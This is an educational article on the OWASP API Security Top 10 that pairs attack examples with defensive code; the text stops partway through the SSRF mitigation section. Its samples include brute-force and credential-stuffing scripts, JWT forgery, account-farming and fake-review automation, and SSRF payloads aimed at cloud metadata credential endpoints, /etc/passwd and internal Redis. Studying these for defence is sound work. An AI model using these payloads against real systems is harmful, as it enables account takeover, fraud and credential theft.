# OWASP API Security Top 10

The OWASP API Security Top 10 is a standard awareness document published by the Open Web Application Security Project that identifies the most critical security risks specific to Application Programming Interfaces. First released in 2019 and updated in 2023, this list addresses vulnerabilities unique to or more prevalent in API architectures compared to traditional web applications. While APIs share some vulnerabilities with standard web applications (SQL injection, XSS), the OWASP API Top 10 focuses on risks arising from API-specific characteristics: mass data exposure through endpoints designed for programmatic access, broken authorization enabling resource enumeration, business logic abuse through automated API calls, and configuration issues from complex microservices architectures. Understanding the mapping between these API-specific risks and traditional web security concepts enables comprehensive security testing across both API and web application layers.

The fundamental insight: **APIs concentrate powerful functionality into automated interfaces**—traditional web security concepts manifest differently and often more severely in API contexts.

## OWASP API Security Top 10 (2023) Overview

### The complete list

| Rank | Risk Name | Primary Impact |
|------|-----------|----------------|
| **API1:2023** | Broken Object Level Authorization | Unauthorized data access |
| **API2:2023** | Broken Authentication | Account takeover, impersonation |
| **API3:2023** | Broken Object Property Level Authorization | Data exposure, manipulation |
| **API4:2023** | Unrestricted Resource Consumption | DoS, financial loss |
| **API5:2023** | Broken Function Level Authorization | Privilege escalation |
| **API6:2023** | Unrestricted Access to Sensitive Business Flows | Business logic abuse |
| **API7:2023** | Server Side Request Forgery | Internal system access |
| **API8:2023** | Security Misconfiguration | Various exploits |
| **API9:2023** | Improper Inventory Management | Shadow API exploitation |
| **API10:2023** | Unsafe Consumption of APIs | Supply chain attacks |

### Changes from 2019 to 2023

**New entries (2023):**
- API6: Unrestricted Access to Sensitive Business Flows
- API7: Server Side Request Forgery (SSRF)
- API10: Unsafe Consumption of APIs

**Removed from 2019:**
- Insufficient Logging & Monitoring (moved to broader security practices)
- Injection (absorbed into other categories as API-specific manifestations)

**Renamed/Reorganized:**
- Mass Assignment → Broken Object Property Level Authorization (broader scope)
- Excessive Data Exposure → Broken Object Property Level Authorization (consolidated)

## API1:2023 - Broken Object Level Authorization (BOLA)

### What is BOLA?

**Definition:** APIs fail to validate that a user is authorized to access a specific object (resource).

**Also known as:** IDOR (Insecure Direct Object Reference)

**Core issue:** API trusts client-provided object identifiers without checking ownership.

### How BOLA manifests in APIs

**Vulnerable API endpoint:**
```http
GET /api/users/1234/orders HTTP/1.1
Authorization: Bearer <user_5678_token>

Response:
[
    {"orderId": "ORD-001", "amount": 999.99, "item": "Laptop"},
    {"orderId": "ORD-002", "amount": 50.00, "item": "Mouse"}
]
```

**Attack: Change user ID**
```http
GET /api/users/1234/orders HTTP/1.1
Authorization: Bearer <user_5678_token>

User 5678 accessing User 1234's orders!
```

**If vulnerable:**
```
Response: User 1234's orders returned
→ BOLA vulnerability confirmed
```

### Common BOLA patterns

**Pattern 1: Numeric ID enumeration**
```http
GET /api/documents/1 HTTP/1.1
GET /api/documents/2 HTTP/1.1
GET /api/documents/3 HTTP/1.1
...
GET /api/documents/9999 HTTP/1.1

Attacker enumerates all documents
```

**Pattern 2: UUID/GUID exploitation**
```http
GET /api/reports/a3d5f7c9-1234-5678-9abc-def012345678 HTTP/1.1

Even though UUIDs are unpredictable:
- May leak through other endpoints
- May be sequential or guessable
- Still requires authorization check
```

**Pattern 3: Username/email-based access**
```http
GET /api/profiles/john.doe@example.com HTTP/1.1
GET /api/profiles/admin@example.com HTTP/1.1

Email addresses often predictable or enumerable
```

**Pattern 4: Nested resources**
```http
GET /api/companies/123/employees/456/salary HTTP/1.1

Check authorization at each level:
- Can user access company 123?
- Can user access employee 456?
- Can user access salary information?
```

### Real-world BOLA examples

**Example 1: Healthcare records**
```http
GET /api/patients/12345/medical-records HTTP/1.1
Authorization: Bearer <doctor_token>

Vulnerable: Any authenticated user can change patient ID
Impact: HIPAA violation, patient privacy breach
```

**Example 2: Financial transactions**
```http
GET /api/accounts/987654/transactions HTTP/1.1
Authorization: Bearer <user_token>

Vulnerable: User can access any account's transactions
Impact: Financial data exposure, fraud
```

**Example 3: Social media private content**
```http
GET /api/users/alice/private-photos HTTP/1.1
Authorization: Bearer <bob_token>

Vulnerable: Bob can access Alice's private photos
Impact: Privacy violation
```

### Web Security Academy alignment

**Relevant topic: Access Control Vulnerabilities and Privilege Escalation**

**Key concepts:**

**Horizontal privilege escalation:**
```
User A → Access User B's resources
Same privilege level, different user

Example:
GET /api/users/userA/profile (authorized)
GET /api/users/userB/profile (BOLA vulnerability)
```

**Testing methodology:**
```
1. Create two accounts (User A, User B)
2. Authenticate as User A
3. Identify resources belonging to User A
4. Attempt to access User B's resources using User A's token
5. If successful → BOLA vulnerability
```

**Mitigation:**
```javascript
// Vulnerable code
app.get('/api/users/:userId/orders', authenticate, async (req, res) => {
    const userId = req.params.userId;
    const orders = await Order.find({ userId });
    res.json(orders);
});

// Secure code
app.get('/api/users/:userId/orders', authenticate, async (req, res) => {
    const requestedUserId = req.params.userId;
    const authenticatedUserId = req.user.id;
    
    // Check authorization
    if (requestedUserId !== authenticatedUserId && !req.user.isAdmin) {
        return res.status(403).json({ error: 'Unauthorized' });
    }
    
    const orders = await Order.find({ userId: requestedUserId });
    res.json(orders);
});
```

## API2:2023 - Broken Authentication

### What is broken authentication in APIs?

**Definition:** Weak authentication mechanisms allow attackers to compromise authentication tokens or exploit implementation flaws.

**API-specific concerns:**
- APIs often use token-based authentication (JWT, OAuth)
- No browser security features (same-origin policy, cookies with httpOnly)
- Credentials sent with every request (stateless)
- Often targets for automated attacks

### Common authentication vulnerabilities

**Vulnerability 1: Weak JWT implementation**

**Insecure JWT:**
```json
Header:
{
    "alg": "none",
    "typ": "JWT"
}

Payload:
{
    "userId": 123,
    "role": "admin",
    "exp": 1708300000
}

Signature: (none)
```

**Attack: Algorithm confusion**
```javascript
// Change alg from RS256 to HS256
// Sign with public key (treating it as symmetric key)
// Server may accept due to algorithm confusion
```

**Vulnerability 2: Missing token expiration**

**Token never expires:**
```http
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

Token remains valid indefinitely
→ Stolen token provides permanent access
```

**Vulnerability 3: Password brute force (no rate limiting)**

**Attack:**
```python
passwords = load_password_list()

for password in passwords:
    response = requests.post('https://api.example.com/login', 
        json={'username': 'admin', 'password': password})
    
    if response.status_code == 200:
        print(f"Password found: {password}")
        break

# No rate limiting → 1000s of attempts per minute
```

**Vulnerability 4: OAuth misconfiguration**

**Insecure OAuth flow:**
```http
Authorization callback:
GET /oauth/callback?code=AUTH_CODE&redirect_uri=https://attacker.com

Vulnerable app doesn't validate redirect_uri
→ Authorization code sent to attacker
```

**Vulnerability 5: API key exposure**

**Hardcoded in client:**
```javascript
// Mobile app source code
const API_KEY = "sk_live_1234567890abcdef";

axios.get('https://api.example.com/data', {
    headers: { 'X-API-Key': API_KEY }
});

// API key extracted from decompiled app
```

### Web Security Academy alignment

**Relevant topics:**

**1. Authentication Vulnerabilities**

**Username enumeration:**
```http
POST /api/login HTTP/1.1
{"username": "admin", "password": "wrong"}

Response (vulnerable):
{"error": "Invalid password"} → Username exists

Response (secure):
{"error": "Invalid credentials"} → Generic message
```

**Credential stuffing:**
```
Use leaked credentials from other breaches
API lacks account lockout
→ Successful account compromise
```

**2. OAuth 2.0 Authentication Vulnerabilities**

**Authorization code interception:**
```
Attack flow:
1. Victim initiates OAuth login
2. Attacker intercepts authorization code
3. Attacker exchanges code for access token
4. Attacker gains access to victim's account
```

**3. JWT Attacks**

**JWT signature verification bypass:**
```json
// Original token
{"alg": "HS256", "typ": "JWT"}
{"userId": 123, "role": "user"}

// Attack: Change algorithm to "none"
{"alg": "none", "typ": "JWT"}
{"userId": 123, "role": "admin"}
// No signature

// Vulnerable server accepts unsigned token
```

**JWT key confusion:**
```
Server uses RS256 (asymmetric)
Attacker changes alg to HS256 (symmetric)
Signs with public key
Server verifies with public key as HMAC secret
→ Token accepted
```

### Mitigation strategies

**Secure authentication implementation:**
```javascript
const jwt = require('jsonwebtoken');
const bcrypt = require('bcrypt');
const rateLimit = require('express-rate-limit');

// Rate limiting
const loginLimiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 5, // 5 attempts
    message: 'Too many login attempts'
});

// Secure login endpoint
app.post('/api/login', loginLimiter, async (req, res) => {
    const { username, password } = req.body;
    
    // Find user (timing-safe)
    const user = await User.findOne({ username });
    
    // Verify password (timing-safe)
    const validPassword = user ? 
        await bcrypt.compare(password, user.passwordHash) : 
        await bcrypt.compare(password, '$2b$10$dummy.hash');
    
    if (!user || !validPassword) {
        // Generic error (prevent username enumeration)
        return res.status(401).json({ error: 'Invalid credentials' });
    }
    
    // Generate JWT with expiration
    const token = jwt.sign(
        { userId: user.id, role: user.role },
        process.env.JWT_SECRET,
        { 
            algorithm: 'HS256',
            expiresIn: '1h',
            issuer: 'api.example.com',
            audience: 'api.example.com'
        }
    );
    
    res.json({ token, expiresIn: 3600 });
});

// JWT verification middleware
function authenticate(req, res, next) {
    const token = req.headers.authorization?.split(' ')[1];
    
    if (!token) {
        return res.status(401).json({ error: 'No token provided' });
    }
    
    try {
        const decoded = jwt.verify(token, process.env.JWT_SECRET, {
            algorithms: ['HS256'], // Explicitly specify algorithm
            issuer: 'api.example.com',
            audience: 'api.example.com'
        });
        
        req.user = decoded;
        next();
    } catch (err) {
        if (err.name === 'TokenExpiredError') {
            return res.status(401).json({ error: 'Token expired' });
        }
        res.status(401).json({ error: 'Invalid token' });
    }
}
```

## API3:2023 - Broken Object Property Level Authorization

### What is broken object property level authorization?

**Definition:** APIs expose sensitive object properties that users shouldn't be able to read (excessive data exposure) or modify (mass assignment).

**Two manifestations:**

**1. Excessive data exposure (read):**
```http
GET /api/users/123 HTTP/1.1

Response exposes too much data:
{
    "id": 123,
    "username": "alice",
    "email": "alice@example.com",
    "password_hash": "$2b$10$...",  // Shouldn't expose
    "ssn": "123-45-6789",            // Sensitive
    "api_secret": "sk_live_...",     // Credentials
    "internal_notes": "VIP customer" // Internal
}
```

**2. Mass assignment (write):**
```http
PATCH /api/users/123 HTTP/1.1
{
    "username": "alice",
    "email": "alice@example.com",
    "isAdmin": true  // Shouldn't be modifiable by user
}

Vulnerable API accepts isAdmin parameter
→ Privilege escalation
```

### Excessive data exposure examples

**Example 1: User profile API**

**Vulnerable response:**
```json
GET /api/profile

{
    "userId": 123,
    "displayName": "Alice",
    "email": "alice@example.com",
    "phoneNumber": "+1-555-0123",
    "dateOfBirth": "1990-01-15",
    "ssn": "123-45-6789",
    "creditCards": [
        {"number": "4532-1234-5678-9012", "cvv": "123"}
    ],
    "passwordHash": "$2b$10$...",
    "apiKey": "sk_live_abc123...",
    "internalNotes": "Premium customer, handle with care",
    "lastLoginIP": "192.168.1.100",
    "sessionToken": "abc123xyz..."
}
```

**Proper response (minimal exposure):**
```json
{
    "userId": 123,
    "displayName": "Alice",
    "email": "alice@example.com"
}
```

**Example 2: Search results over-exposure**

**Vulnerable:**
```http
GET /api/users/search?q=alice

Response:
[
    {
        "username": "alice123",
        "email": "alice@example.com",  // Sensitive
        "phone": "+1-555-0123",        // Sensitive
        "address": "123 Main St",      // Sensitive
        "salary": 75000                // Highly sensitive
    }
]
```

**Secure:**
```json
[
    {
        "username": "alice123",
        "displayName": "Alice Smith"
    }
]
```

### Mass assignment examples

**Example 1: Profile update**

**Vulnerable endpoint:**
```javascript
app.patch('/api/users/:id', authenticate, async (req, res) => {
    // Dangerous: Accepts all properties from request body
    await User.updateOne(
        { _id: req.params.id },
        req.body  // No filtering!
    );
    
    res.json({ message: 'Updated' });
});
```

**Attack:**
```http
PATCH /api/users/123 HTTP/1.1
{
    "username": "alice",
    "accountBalance": 1000000,
    "isAdmin": true,
    "isPremium": true,
    "accountType": "enterprise"
}

All fields accepted → Privilege escalation!
```

**Example 2: Product creation**

**Vulnerable:**
```http
POST /api/products HTTP/1.1
{
    "name": "Laptop",
    "description": "...",
    "price": 0.01,  // Should default to proper price
    "featured": true,  // Should be admin-only
    "approved": true   // Should require approval workflow
}
```

### Web Security Academy alignment

**Relevant topic: Mass Assignment Vulnerabilities**

**Testing methodology:**

**Step 1: Retrieve full object**
```http
GET /api/users/123 HTTP/1.1

Response shows all properties:
{
    "username": "alice",
    "email": "alice@example.com",
    "role": "user",
    "isVerified": true,
    "credits": 100
}
```

**Step 2: Attempt to modify hidden properties**
```http
PATCH /api/users/123 HTTP/1.1
{
    "username": "alice",
    "role": "admin",
    "credits": 9999
}
```

**Step 3: Verify if changes accepted**
```http
GET /api/users/123 HTTP/1.1

If role changed to "admin" or credits increased:
→ Mass assignment vulnerability confirmed
```

### Mitigation strategies

**Defense 1: Property allowlisting**
```javascript
const ALLOWED_USER_UPDATES = ['username', 'email', 'bio', 'avatar'];

app.patch('/api/users/:id', authenticate, async (req, res) => {
    // Filter to only allowed properties
    const updates = {};
    for (const key of ALLOWED_USER_UPDATES) {
        if (req.body.hasOwnProperty(key)) {
            updates[key] = req.body[key];
        }
    }
    
    await User.updateOne({ _id: req.params.id }, updates);
    res.json({ message: 'Updated' });
});
```

**Defense 2: Response filtering**
```javascript
app.get('/api/users/:id', authenticate, async (req, res) => {
    const user = await User.findById(req.params.id);
    
    // Only return safe properties
    const safeUser = {
        id: user.id,
        username: user.username,
        displayName: user.displayName,
        avatar: user.avatar
    };
    
    res.json(safeUser);
});
```

**Defense 3: Separate DTOs (Data Transfer Objects)**
```javascript
class UserResponseDTO {
    constructor(user) {
        this.id = user.id;
        this.username = user.username;
        this.email = user.email;
        // Only include safe properties
    }
}

app.get('/api/users/:id', authenticate, async (req, res) => {
    const user = await User.findById(req.params.id);
    res.json(new UserResponseDTO(user));
});
```

## API4:2023 - Unrestricted Resource Consumption

### What is unrestricted resource consumption?

**Definition:** API lacks resource limits, allowing attackers to cause denial of service or financial damage through excessive requests or resource-intensive operations.

**Common manifestations:**
- No rate limiting (unlimited requests)
- No pagination limits (massive data retrieval)
- Resource-intensive operations without throttling
- No timeout enforcement
- Unlimited file uploads

### Attack scenarios

**Scenario 1: Rate limiting bypass → Credential stuffing**
```python
# No rate limiting allows unlimited login attempts
credentials = load_leaked_credentials()  # Millions of credentials

for username, password in credentials:
    response = requests.post('https://api.example.com/login',
        json={'username': username, 'password': password})
    
    if response.status_code == 200:
        print(f"Valid: {username}:{password}")

# API allows millions of requests → Successful account compromise
```

**Scenario 2: Excessive data requests**
```http
GET /api/users?limit=999999999 HTTP/1.1

API attempts to return billions of records
→ Database overload
→ Memory exhaustion
→ Application crash
```

**Scenario 3: Resource-intensive operations**
```http
POST /api/reports/generate HTTP/1.1
{
    "startDate": "1900-01-01",
    "endDate": "2026-12-31",
    "includeAllDetails": true,
    "format": "PDF"
}

Generates massive report
→ High CPU usage
→ Extended processing time
→ Server unresponsive
```

**Scenario 4: File upload abuse**
```http
POST /api/upload HTTP/1.1
Content-Type: multipart/form-data

[10GB file uploaded]

No size limits
→ Disk space exhaustion
→ Bandwidth consumption
→ Processing overhead
```

**Scenario 5: API cost exploitation**
```http
POST /api/send-sms HTTP/1.1
{
    "to": "+1-555-0123",
    "message": "Hello"
}

No limit on SMS sending
→ Attacker sends millions of SMS
→ Financial cost to API owner
```

### Web Security Academy alignment

**Relevant topics:**

**1. Race Conditions**

**Example: Race condition in resource creation**
```python
import threading

def create_order():
    requests.post('https://api.example.com/orders',
        headers={'Authorization': f'Bearer {token}'},
        json={'productId': 1, 'quantity': 1})

# Launch 100 simultaneous requests
threads = []
for i in range(100):
    t = threading.Thread(target=create_order)
    threads.append(t)
    t.start()

# Race condition: All 100 orders created
# But user only charged for 1 due to race condition in payment check
```

**2. File Upload Vulnerabilities**

**Unrestricted file uploads:**
```http
POST /api/upload/avatar HTTP/1.1
Content-Type: multipart/form-data

[Uploading 5GB file as avatar]

No size check → Disk space exhaustion
No file type check → Malicious file upload
No processing limits → CPU exhaustion
```

### Mitigation strategies

**Defense 1: Rate limiting**
```javascript
const rateLimit = require('express-rate-limit');

// Global rate limit
const globalLimiter = rateLimit({
    windowMs: 60 * 1000, // 1 minute
    max: 100, // 100 requests per minute
    message: 'Too many requests',
    standardHeaders: true
});

// Strict limit for sensitive endpoints
const authLimiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 5, // 5 attempts
    message: 'Too many login attempts'
});

app.use('/api/', globalLimiter);
app.post('/api/login', authLimiter, loginHandler);
```

**Defense 2: Pagination and result limits**
```javascript
app.get('/api/users', authenticate, async (req, res) => {
    const page = Math.max(1, parseInt(req.query.page) || 1);
    const limit = Math.min(100, parseInt(req.query.limit) || 20); // Max 100
    
    const skip = (page - 1) * limit;
    
    const users = await User.find()
        .skip(skip)
        .limit(limit)
        .select('id username email');
    
    const total = await User.countDocuments();
    
    res.json({
        data: users,
        pagination: {
            page,
            limit,
            total,
            pages: Math.ceil(total / limit)
        }
    });
});
```

**Defense 3: File upload restrictions**
```javascript
const multer = require('multer');

const upload = multer({
    storage: multer.memoryStorage(),
    limits: {
        fileSize: 5 * 1024 * 1024, // 5MB max
        files: 1 // Single file only
    },
    fileFilter: (req, file, cb) => {
        // Allowed MIME types
        const allowedTypes = ['image/jpeg', 'image/png', 'image/gif'];
        
        if (!allowedTypes.includes(file.mimetype)) {
            cb(new Error('Invalid file type'), false);
        } else {
            cb(null, true);
        }
    }
});

app.post('/api/upload', authenticate, upload.single('file'), (req, res) => {
    res.json({ message: 'File uploaded', filename: req.file.filename });
});
```

**Defense 4: Operation timeouts**
```javascript
app.post('/api/reports/generate', authenticate, async (req, res) => {
    // Set timeout for long operations
    const timeout = new Promise((resolve, reject) => {
        setTimeout(() => reject(new Error('Operation timeout')), 30000); // 30s
    });
    
    const generateReport = Report.generate(req.body);
    
    try {
        const report = await Promise.race([generateReport, timeout]);
        res.json(report);
    } catch (err) {
        if (err.message === 'Operation timeout') {
            res.status(408).json({ error: 'Request timeout' });
        } else {
            res.status(500).json({ error: 'Generation failed' });
        }
    }
});
```

**Defense 5: Cost-based throttling**
```javascript
// Track expensive operations per user
const userOperationCounts = new Map();

app.post('/api/send-sms', authenticate, async (req, res) => {
    const userId = req.user.id;
    const count = userOperationCounts.get(userId) || 0;
    
    // Limit expensive operations
    if (count >= 10) { // 10 SMS per hour
        return res.status(429).json({ 
            error: 'SMS limit reached',
            resetAt: Date.now() + (60 * 60 * 1000)
        });
    }
    
    await sendSMS(req.body.to, req.body.message);
    
    userOperationCounts.set(userId, count + 1);
    
    // Reset counter after 1 hour
    setTimeout(() => {
        userOperationCounts.delete(userId);
    }, 60 * 60 * 1000);
    
    res.json({ message: 'SMS sent' });
});
```

## API5:2023 - Broken Function Level Authorization

### What is broken function level authorization?

**Definition:** API fails to properly enforce authorization checks for administrative or privileged functions.

**Difference from BOLA:**
- **BOLA:** Access to wrong *object* (horizontal escalation)
- **Broken Function Level:** Access to wrong *function* (vertical escalation)

### Common patterns

**Pattern 1: Admin endpoints without proper authorization**
```http
GET /api/admin/users HTTP/1.1
Authorization: Bearer <regular_user_token>

Vulnerable: Regular user can access admin function
Response: List of all users with sensitive data
```

**Pattern 2: HTTP method confusion**
```http
GET /api/users/123 HTTP/1.1  → Returns user (public)
PUT /api/users/123 HTTP/1.1  → Updates user (should be restricted)
DELETE /api/users/123 HTTP/1.1  → Deletes user (should be admin-only)

Vulnerable: PUT and DELETE not properly restricted
```

**Pattern 3: Missing role checks**
```http
POST /api/products/approve HTTP/1.1
Authorization: Bearer <user_token>
{
    "productId": 123
}

Vulnerable: Regular user can approve products
Should require: Manager or admin role
```

**Pattern 4: Path-based assumptions**
```http
/api/public/products  → Assumed public
/api/internal/products  → Assumed restricted

But: /api/internal/* not actually protected
→ Any authenticated user can access
```

### Real-world examples

**Example 1: E-commerce admin functions**
```http
POST /api/admin/orders/cancel HTTP/1.1
Authorization: Bearer <customer_token>
{
    "orderId": "ORD-999"
}

Vulnerable: Customer can cancel any order
Impact: Business disruption, fraud
```

**Example 2: User management**
```http
POST /api/users/promote HTTP/1.1
Authorization: Bearer <regular_user_token>
{
    "userId": 123,
    "role": "admin"
}

Vulnerable: User can promote themselves to admin
Impact: Full system compromise
```

**Example 3: Financial operations**
```http
POST /api/transactions/refund HTTP/1.1
Authorization: Bearer <user_token>
{
    "transactionId": "TXN-123",
    "amount": 1000
}

Vulnerable: User can issue refunds without authorization
Impact: Financial loss
```

### Web Security Academy alignment

**Relevant topic: Access Control Vulnerabilities and Privilege Escalation**

**Vertical privilege escalation:**
```
Regular User → Admin functions
Lower privilege → Higher privilege

Testing:
1. Authenticate as regular user
2. Identify admin endpoints
3. Attempt to access with regular user token
4. If successful → Broken function level authorization
```

**Common admin functions to test:**
```
User management:
- GET /api/admin/users
- POST /api/admin/users/create
- DELETE /api/admin/users/{id}

Content management:
- POST /api/admin/content/publish
- DELETE /api/admin/content/{id}

Configuration:
- GET /api/admin/settings
- PUT /api/admin/settings

Reports:
- GET /api/admin/reports/financial
- GET /api/admin/reports/user-activity

System operations:
- POST /api/admin/system/backup
- POST /api/admin/system/maintenance
```

### Mitigation strategies

**Defense 1: Comprehensive authorization checks**
```javascript
// Role-based access control middleware
function requireRole(...allowedRoles) {
    return (req, res, next) => {
        if (!req.user) {
            return res.status(401).json({ error: 'Authentication required' });
        }
        
        if (!allowedRoles.includes(req.user.role)) {
            return res.status(403).json({ 
                error: 'Insufficient privileges',
                required: allowedRoles,
                current: req.user.role
            });
        }
        
        next();
    };
}

// Apply to endpoints
app.get('/api/users', authenticate, requireRole('admin'), async (req, res) => {
    const users = await User.find();
    res.json(users);
});

app.delete('/api/users/:id', authenticate, requireRole('admin', 'superadmin'), async (req, res) => {
    await User.deleteOne({ _id: req.params.id });
    res.json({ message: 'User deleted' });
});
```

**Defense 2: Method-level authorization**
```javascript
app.route('/api/products/:id')
    .get(authenticate, getProduct)  // Any authenticated user
    .put(authenticate, requireRole('editor', 'admin'), updateProduct)  // Editors+
    .delete(authenticate, requireRole('admin'), deleteProduct);  // Admins only
```

**Defense 3: Permission-based access control**
```javascript
const permissions = {
    'users:read': ['user', 'admin'],
    'users:write': ['admin'],
    'users:delete': ['admin'],
    'products:approve': ['manager', 'admin']
};

function requirePermission(permission) {
    return (req, res, next) => {
        const userRole = req.user.role;
        const allowedRoles = permissions[permission];
        
        if (!allowedRoles || !allowedRoles.includes(userRole)) {
            return res.status(403).json({ error: 'Permission denied' });
        }
        
        next();
    };
}

app.post('/api/products/approve', 
    authenticate, 
    requirePermission('products:approve'),
    approveProduct
);
```

## API6:2023 - Unrestricted Access to Sensitive Business Flows

### What is unrestricted access to sensitive business flows?

**Definition:** API lacks protection against automated abuse of legitimate business workflows, allowing attackers to exploit functionality at scale.

**Key characteristic:** The API functionality is *intentional*, but unrestricted automated access creates abuse scenarios.

### Common abuse scenarios

**Scenario 1: Ticket scalping**
```http
POST /api/tickets/purchase HTTP/1.1
{
    "eventId": 123,
    "quantity": 10
}

Attacker automation:
- Monitors ticket release
- Instantly purchases maximum allowed
- Resells at inflated prices

No CAPTCHA or bot detection
→ Legitimate customers can't purchase
```

**Scenario 2: Limited inventory exploitation**
```http
POST /api/products/reserve HTTP/1.1
{
    "productId": 999,  // Limited edition item
    "quantity": 1
}

Bot behavior:
- Launches hundreds of simultaneous requests
- Reserves all available inventory
- Legitimate users see "Out of stock"

No rate limiting or fraud detection
→ Business disruption
```

**Scenario 3: Promotional abuse**
```python
# Create multiple accounts to claim welcome bonus
for i in range(1000):
    email = f"user{i}@disposable.com"
    
    # Create account
    requests.post('https://api.example.com/signup', 
        json={'email': email, 'password': 'pass123'})
    
    # Claim $10 welcome bonus
    requests.post('https://api.example.com/claim-bonus',
        headers={'Authorization': f'Bearer {get_token(email)}'})
    
    # Transfer bonus to main account
    requests.post('https://api.example.com/transfer',
        json={'to': 'attacker@example.com', 'amount': 10})

Total: $10,000 stolen through automated account creation
```

**Scenario 4: Price manipulation**
```http
POST /api/products/bid HTTP/1.1
{
    "productId": 456,
    "bidAmount": 1000.01
}

Automated bidding:
- Bot monitors competing bids
- Automatically outbids by $0.01
- Wins at minimal cost

No bid increment limits or auction manipulation detection
```

**Scenario 5: Review manipulation**
```python
# Post fake reviews at scale
products = get_competitor_products()

for product in products:
    for i in range(100):
        # Create disposable account
        account = create_account()
        
        # Post negative review
        post_review(account, product, rating=1, 
            text="Terrible product!")

Competitor reputation damaged by fake reviews
```

### Web Security Academy alignment

**Relevant topic: Business Logic Vulnerabilities**

**Key concepts:**

**1. Excessive trust in client behavior**
```http
POST /api/checkout HTTP/1.1
{
    "items": [{"id": 1, "price": 999.99, "quantity": 1}],
    "total": 999.99
}

Attacker modifies:
{
    "items": [{"id": 1, "price": 0.01, "quantity": 1}],
    "total": 0.01
}

Server trusts client calculation without verification
```

**2. Making flawed assumptions**
```
Assumption: Users complete workflows manually
Reality: Attackers automate workflows at scale

Assumption: Users won't abuse free trials
Reality: Attackers create unlimited accounts

Assumption: Humans can't make 1000 requests/second
Reality: Bots easily exceed this
```

**3. Workflow sequence bypass**
```http
Normal flow:
1. POST /api/cart/add
2. GET /api/cart/review
3. POST /api/payment/process
4. POST /api/order/confirm

Bypass:
Skip steps 2-3, jump directly to:
POST /api/order/confirm
→ Order created without payment
```

### Mitigation strategies

**Defense 1: CAPTCHA on sensitive operations**
```javascript
const axios = require('axios');

app.post('/api/tickets/purchase', authenticate, async (req, res) => {
    const captchaToken = req.body.captchaToken;
    
    // Verify CAPTCHA
    const captchaResponse = await axios.post(
        'https://www.google.com/recaptcha/api/siteverify',
        {
            secret: process.env.RECAPTCHA_SECRET,
            response: captchaToken
        }
    );
    
    if (!captchaResponse.data.success || captchaResponse.data.score < 0.5) {
        return res.status(400).json({ error: 'CAPTCHA verification failed' });
    }
    
    // Proceed with ticket purchase
    // ...
});
```

**Defense 2: Device fingerprinting and behavioral analysis**
```javascript
app.post('/api/signup', async (req, res) => {
    const fingerprint = req.body.deviceFingerprint;
    const ipAddress = req.ip;
    
    // Check for suspicious patterns
    const recentSignups = await Signup.count({
        $or: [
            { fingerprint },
            { ipAddress }
        ],
        createdAt: { $gte: Date.now() - (60 * 60 * 1000) } // Last hour
    });
    
    if (recentSignups > 5) {
        return res.status(429).json({ 
            error: 'Too many signups from this device/IP' 
        });
    }
    
    // Proceed with signup
    // ...
});
```

**Defense 3: Workflow state verification**
```javascript
app.post('/api/order/confirm', authenticate, async (req, res) => {
    const userId = req.user.id;
    
    // Verify previous steps completed
    const cart = await Cart.findOne({ userId, status: 'reviewed' });
    if (!cart) {
        return res.status(400).json({ 
            error: 'Cart must be reviewed before checkout' 
        });
    }
    
    const payment = await Payment.findOne({ 
        userId, 
        cartId: cart.id, 
        status: 'completed' 
    });
    if (!payment) {
        return res.status(400).json({ 
            error: 'Payment must be completed before order confirmation' 
        });
    }
    
    // Verify state hasn't expired
    if (Date.now() - payment.createdAt > 10 * 60 * 1000) { // 10 min
        return res.status(400).json({ error: 'Payment session expired' });
    }
    
    // Proceed with order confirmation
    // ...
});
```

**Defense 4: Quantity and frequency limits**
```javascript
app.post('/api/tickets/purchase', authenticate, async (req, res) => {
    const userId = req.user.id;
    const eventId = req.body.eventId;
    const quantity = req.body.quantity;
    
    // Check per-user limit
    const existingPurchases = await Ticket.count({ userId, eventId });
    if (existingPurchases + quantity > 4) {
        return res.status(400).json({ 
            error: 'Maximum 4 tickets per person' 
        });
    }
    
    // Check velocity (purchases in last hour)
    const recentPurchases = await Ticket.count({
        userId,
        createdAt: { $gte: Date.now() - (60 * 60 * 1000) }
    });
    if (recentPurchases > 10) {
        return res.status(429).json({ 
            error: 'Too many purchases in short time' 
        });
    }
    
    // Proceed with purchase
    // ...
});
```

## API7:2023 - Server Side Request Forgery (SSRF)

### What is SSRF in APIs?

**Definition:** API accepts URLs or external resources from users and makes server-side requests without proper validation, allowing attackers to access internal systems.

**API-specific concerns:**
- APIs often integrate with external services (webhooks, imports, fetchers)
- Microservices architectures have many internal APIs
- Cloud metadata services accessible from application servers

### Common SSRF patterns in APIs

**Pattern 1: URL-based imports**
```http
POST /api/import/data HTTP/1.1
{
    "url": "https://example.com/data.json"
}

Attack:
{
    "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
}

Response exposes AWS credentials!
```

**Pattern 2: Webhook registration**
```http
POST /api/webhooks HTTP/1.1
{
    "event": "user.created",
    "callbackUrl": "https://attacker.com/callback"
}

Attack:
{
    "callbackUrl": "http://internal-admin:8080/delete-all-users"
}

Server makes request to internal admin API
```

**Pattern 3: Image/avatar fetching**
```http
POST /api/users/avatar HTTP/1.1
{
    "avatarUrl": "https://cdn.example.com/avatar.jpg"
}

Attack:
{
    "avatarUrl": "file:///etc/passwd"
}

Or:
{
    "avatarUrl": "http://localhost:6379/SET%20admin%20true"
}

Redis command injection via SSRF
```

**Pattern 4: PDF generation from URL**
```http
POST /api/reports/generate HTTP/1.1
{
    "sourceUrl": "https://example.com/report.html"
}

Attack:
{
    "sourceUrl": "http://internal-database:5432/"
}

Probes internal database
```

### Web Security Academy alignment

**Relevant topic: Server-Side Request Forgery (SSRF)**

**Attack targets:**

**1. Cloud metadata services**
```http
AWS:
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

Google Cloud:
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

Azure:
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

**2. Internal services**
```http
http://localhost:8080/admin
http://192.168.1.100/management
http://internal-api:3000/users
http://database:5432/
```

**3. Port scanning**
```http
http://internal-host:22   → SSH
http://internal-host:3306  → MySQL
http://internal-host:6379  → Redis
http://internal-host:27017 → MongoDB
```

### Mitigation strategies

**Defense 1: URL allowlist**
```javascript
const { URL } = require('url');

const ALLOWED_DOMAINS = [
    'api.example.com',
    'cdn.example.com',
    'partner-api.trusted.com'
];

